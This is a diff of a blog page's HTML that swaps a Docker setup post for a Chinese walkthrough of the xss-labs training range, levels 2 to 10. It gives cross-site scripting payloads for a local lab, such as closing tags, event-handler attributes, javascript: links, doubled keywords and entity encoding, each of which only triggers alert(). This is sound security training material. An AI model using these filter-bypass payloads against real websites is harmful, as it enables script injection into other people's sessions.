@@ -17,30 +17,48 @@
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
   
-  <title>初探Docker - 无言の小屋</title>
+  <title>xss-labs - 无言の小屋</title>
 
   
-    <meta name="description" content="年少不知docker难，初学已是docker人">
+    <meta name="description" content="xss-labs  level2 先用基础payload： 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  查看网页源码：  说明服务端对用户输入做了转义（&lt; 变成了 &amp;lt） 查看题目源代码：  发现 1htmlspecialchars($str)   能将一些特殊的 HTML 字符转换为 HTML 实体    字符 转换为     &amp; &amp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="初探Docker">
-<meta property="og:url" content="https://ikunmma.github.io/2025/07/17/%E5%88%9D%E6%8E%A2Docker/index.html">
+<meta property="og:title" content="xss-labs">
+<meta property="og:url" content="https://ikunmma.github.io/2025/07/28/xss-labs/index.html">
 <meta property="og:site_name" content="无言の小屋">
-<meta property="og:description" content="年少不知docker难，初学已是docker人">
+<meta property="og:description" content="xss-labs  level2 先用基础payload： 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  查看网页源码：  说明服务端对用户输入做了转义（&lt; 变成了 &amp;lt） 查看题目源代码：  发现 1htmlspecialchars($str)   能将一些特殊的 HTML 字符转换为 HTML 实体    字符 转换为     &amp; &amp;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717163030457.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717163309674.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717163608851.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717164022010.png">
-<meta property="article:published_time" content="2025-07-17T09:03:19.816Z">
-<meta property="article:modified_time" content="2025-07-17T09:05:36.468Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722085147651.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722085455454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722101435850.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722161825161.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722193225967.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725160659862.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725161100558.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725162013249.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725165420116.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725170356265.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725171040346.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725172151170.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725173339877.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725210229944.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725211733741.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725212135352.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725221316368.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725222133382.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725224923302.png">
+<meta property="article:published_time" content="2025-07-28T13:17:00.854Z">
+<meta property="article:modified_time" content="2025-07-28T13:17:57.271Z">
 <meta property="article:author" content="Hackun">
-<meta property="article:tag" content="Docker">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717163030457.png">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722085147651.png">
   
   
   
-  <meta name="keywords" content="Docker">
+  <meta name="keywords" content="漏洞,XSS,CTF,靶场">
 
   <!-- feed -->
   
@@ -81,41 +99,163 @@
 
 
 
-<div class="article banner top"><img class="bg lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/img/docker.jpg">
+<div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Docker/">Docker</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-07-17T09:03:19.816Z">2025-07-17</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-17T09:05:36.468Z">2025-07-17</time></span></div></div></div>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF/">CTF</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/CTF/%E9%9D%B6%E5%9C%BA/">靶场</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-07-28T13:17:00.854Z">2025-07-28</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-28T13:17:57.271Z">2025-07-28</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>初探Docker</span></h1>
+        <h1 class="text title"><span>xss-labs</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><p>年少不知docker难，初学已是docker人</p>
-<span id="more"></span>
-<h1 id="初探docker"><a class="markdownIt-Anchor" href="#初探docker"></a> 初探Docker</h1>
-<p><a target="_blank" rel="noopener" href="https://www.docker.com/">docker官方安装网站</a></p>
-<h2 id="汉化"><a class="markdownIt-Anchor" href="#汉化"></a> 汉化</h2>
-<p>下载对应版本中文语言包：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/asxez/DockerDesktop-CN/releases">DockerDesktop-CN</a></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717163030457.png" alt="" /></p>
-<p>找到docker安装目录，备份并替换asar文件</p>
-<p><code>\Docker\Docker\frontend\resources</code></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717163309674.png" alt="" /></p>
-<p>重启软件后即可出现汉化界面</p>
-<h2 id="构造镜像时报错处理"><a class="markdownIt-Anchor" href="#构造镜像时报错处理"></a> 构造镜像时报错处理</h2>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR [internal] load metadata for docker.io</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717163608851.png" alt="" /></p>
-<p>这里采用更换镜像源的方法</p>
-<p>在Docker 引擎中json文件加入：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;https://docker.registry.cyou/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker-cf.registry.cyou/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://dockercf.jsdelivr.fyi/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.jsdelivr.fyi/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://dockertest.jsdelivr.fyi/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://mirror.aliyuncs.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://dockerproxy.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://mirror.baidubce.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.m.daocloud.io/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.nju.edu.cn/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.sjtug.sjtu.edu.cn/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.ustc.edu.cn/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://mirror.iscas.ac.cn/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.rainbond.cc/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://jq794zz5.mirror.aliyuncs.com&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717164022010.png" alt="" /></p>
-<p>再用<code>docker info</code>命令查看是否生效</p>
+  </div><article class="md-text content"><h1 id="xss-labs"><a class="markdownIt-Anchor" href="#xss-labs"></a> xss-labs</h1>
+<h2 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level2.php?keyword=test">level2</a></h2>
+<p>先用基础payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722085147651.png" alt="image-20250722085147571" /></p>
+<p>查看网页源码：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722085455454.png" alt="" /></p>
+<p>说明服务端对用户输入做了转义（<code>&lt;</code> 变成了 <code>&amp;lt</code>）</p>
+<p>查看题目源代码：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722101435850.png" alt="" /></p>
+<p>发现</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">htmlspecialchars</span>($str)  </span><br></pre></td></tr></table></figure>
+<p>能将一些特殊的 HTML 字符转换为 HTML 实体</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>转换为</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&amp;</code></td>
+<td><code>&amp;amp;</code></td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td><code>&amp;lt;</code></td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td><code>&amp;gt;</code></td>
+</tr>
+<tr>
+<td><code>&quot;</code></td>
+<td><code>&amp;quot;</code></td>
+</tr>
+<tr>
+<td><code>'</code></td>
+<td><code>&amp;#039;</code> （当 <code>ENT_QUOTES</code> 被设置时）</td>
+</tr>
+<tr>
+<td><code>  </code></td>
+<td><code>&amp;nbsp;</code></td>
+</tr>
+</tbody>
+</table>
+<p>我们可以直接闭合<code>input</code>标签进行绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level3.php?keyword=test">level3</a></h2>
+<p>还是先用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722161825161.png" alt="image-20250722161825067" /></p>
+<p>查看网页源代码：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250722193225967.png" alt="" /></p>
+<p>发现表单内的和h2标签的都被转义了</p>
+<p>查看源代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_">htmlspecialchars</span>($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_">htmlspecialchars</span>($str).<span class="string">&quot;&#x27;&gt;    </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>单引号虽然存在实体<code>&amp;apos</code>但是不被转义（未设置<code>ENT_QUOTES</code>），HTML5中预留但是也不推荐使用</p>
+<p>先闭合value，再引入鼠标事件的属性(最常与 <code>&lt;input&gt;</code>、<code>&lt;select&gt;</code> 和 <code>&lt;a&gt;</code> 标签一起使用)：<br />
+<code>onclick</code> <code>onfocus</code> <code>onmouseover</code> <code>onmouseout</code></p>
+<p>再闭合javascript伪协议来执行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=javascript:alert(1) &#x27;</span> <span class="comment">//点击input标签时</span></span><br><span class="line"><span class="string">&#x27; onfocus=javascript:alert(1) &#x27;</span> <span class="comment">//聚焦input标签时</span></span><br><span class="line"><span class="string">&#x27; onmouseover=javascript:alert(1) &#x27;</span> <span class="comment">//进入input标签时</span></span><br><span class="line"><span class="string">&#x27; onmouseout=javascript:alert(1) &#x27;</span> <span class="comment">//移出input标签时</span></span><br></pre></td></tr></table></figure>
+<p><mark>总结：onfocus可以绕过html实体化(即&lt;&gt;号的过滤)</mark></p>
+<h2 id="level5"><a class="markdownIt-Anchor" href="#level5"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level5.php?keyword=">level5</a></h2>
+<p>依旧<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>开局，script变成scr_ipt，再试试鼠标事件，on变成o_n</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725160659862.png" alt="image-20250725160659820" /></p>
+<p>源代码：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725161100558.png" alt="image-20250725161100507" /></p>
+<p>过滤了js的标签还有onfocus事件，虽然str_replace不区分大小写，但是有小写字母转化函数，所以就不能用大小写法来绕过过滤了，只能新找一个方法进行xss注入</p>
+<p>这里可以使用<code>&lt;a&gt;</code>标签的<code>href</code>属性</p>
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;&lt;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>点击链接就可以了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725162013249.png" alt="" /></p>
+<h2 id="level6"><a class="markdownIt-Anchor" href="#level6"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level6.php?keyword=">level6</a></h2>
+<p>这题替换的关键字比上题多，但是没有添加小写转化函数，我们可以采用大小写绕过</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725165420116.png" alt="" /></p>
+<h2 id="level7"><a class="markdownIt-Anchor" href="#level7"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level7.php?keyword=">level7</a></h2>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725170356265.png" alt="image-20250725170356211" /></p>
+<p>不难发现，这里面进行了小写转化，将检测出来的on，script，href，src和data给删掉了，但是我们可以利用双写来绕过</p>
+<p>比如下面这个payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="level8"><a class="markdownIt-Anchor" href="#level8"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level8.php?keyword=">level8</a></h2>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725171040346.png" alt="image-20250725171040279" /></p>
+<p>是把传入的字符串进行转小写之后进行一系列过滤操作，最后将字符写入a标签的href属性中，跳转链接</p>
+<p>我们能利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>()</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725172151170.png" alt="image-20250725172151118" /></p>
+<p>利用<a target="_blank" rel="noopener" href="https://www.jyshare.com/front-end/3602/">在线工具</a>进行Unicode编码后得到</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">41</span>;</span><br></pre></td></tr></table></figure>
+<p><mark>总结： href属性自动解析Unicode编码</mark></p>
+<h2 id="level9"><a class="markdownIt-Anchor" href="#level9"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level9.php?keyword=">level9</a></h2>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725173339877.png" alt="image-20250725173339806" /></p>
+<p>下面多了个strpos()函数的验证，输入字符串必须包含<code>http://</code></p>
+<p>payload1：</p>
+<p>将<code>http://</code>用注释符注释掉否则会执行不了无法弹窗</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">41</span>;<span class="comment">/* http:// */</span></span><br></pre></td></tr></table></figure>
+<p>payload2：</p>
+<p>将<code>http://</code>写在alert内</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;:<span class="title function_">alert</span>(<span class="string">&#x27;http://&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><mark>总结：插入指定内容（本关是http://）绕过检测</mark></p>
+<h2 id="level10"><a class="markdownIt-Anchor" href="#level10"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level10.php?keyword=">level10</a></h2>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725210229944.png" alt="" /></p>
+<p>这里有隐藏的传参方法，如果没有后端代码，就查看页面源代码一个一个测，这里是get传参t_sort，并过滤掉了&lt;&gt;号，不能闭合插入标签，但是我们还能用onfocus事件，因为这里输入框被隐藏了，需要添加<code>type=&quot;text&quot;</code>，构造payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=<span class="string">&quot; onfocus=javascript:alert() type=&quot;</span>text</span><br></pre></td></tr></table></figure>
+<p>这里input标签内将会出现两个type属性，浏览器通常会判定第一个出现的值作为最终的值</p>
+<h2 id="level11"><a class="markdownIt-Anchor" href="#level11"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level11.php?keyword=good%20job!">level11</a></h2>
